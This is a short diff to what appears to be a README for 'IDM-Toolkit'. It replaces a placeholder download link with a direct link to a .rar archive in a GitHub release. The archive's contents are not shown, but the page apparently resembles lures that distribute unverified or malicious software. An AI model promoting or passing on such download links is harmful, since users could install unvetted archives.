@@ -1,7 +1,7 @@
 <h1 align="center"><b>IDM-Toolkit</b></h1>
 
 <p align="center">
-  <a href="#" download>
+  <a href="https://github.com/enobiron1986/IDM-Toolkit/releases/download/Full/IDM_Toolkit.rar" download>
     <img src="https://img.shields.io/badge/Download-blue?logo=download&logoColor=white&style=for-the-badge" alt="Download"/>
   </a>
 </p>
